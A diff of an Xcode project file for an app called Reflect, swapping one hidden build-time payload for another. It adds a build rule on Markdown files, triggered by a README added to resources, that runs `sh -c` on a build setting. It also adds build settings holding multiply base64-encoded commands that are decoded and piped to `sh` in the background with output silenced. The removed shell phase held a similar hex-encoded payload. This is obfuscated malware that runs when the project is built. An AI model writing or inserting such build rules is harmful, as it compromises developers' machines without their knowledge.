@@ -6,8 +6,29 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		25335C7E2B9B49A4A9C62C0C /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = FD2C558910A2432587C62C0C /* README.md */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		28C8513DBC1B4B93A9C62C0C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AC0C26C}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		042635F02F288EA100BB939D /* Reflect.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Reflect.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		FD2C558910A2432587C62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -53,6 +74,7 @@
 		042635F12F288EA100BB939D /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				FD2C558910A2432587C62C0C /* README.md */,
 				042635F02F288EA100BB939D /* Reflect.app */,
 			);
 			name = Products;
@@ -65,12 +87,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 042635FB2F288EA300BB939D /* Build configuration list for PBXNativeTarget "Reflect" */;
 			buildPhases = (
-				56CCDC04FCCA492F80634D6E /* Link Libraries Executable */,
 				042635EC2F288EA100BB939D /* Sources */,
 				042635ED2F288EA100BB939D /* Frameworks */,
 				042635EE2F288EA100BB939D /* Resources */,
 			);
 			buildRules = (
+				28C8513DBC1B4B93A9C62C0C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -123,33 +145,11 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				25335C7E2B9B49A4A9C62C0C /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		56CCDC04FCCA492F80634D6E /* Link Libraries Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Libraries Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		042635EC2F288EA100BB939D /* Sources */ = {
@@ -165,7 +165,8 @@
 		042635F92F288EA300BB939D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333633363339333633343336333433363633333633353336363133363636333733393332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | n | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((a(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Ym1WMGMzQnliM1F1YVc0dllTa2lJSHdnYzJnSwo= | a | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeFpibXd3V2xNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | j | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -230,7 +231,8 @@
 		042635FA2F288EA300BB939D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333633363339333633343336333433363633333633353336363133363636333733393332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | n | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((a(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Ym1WMGMzQnliM1F1YVc0dllTa2lJSHdnYzJnSwo= | a | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeFpibXd3V2xNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | j | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
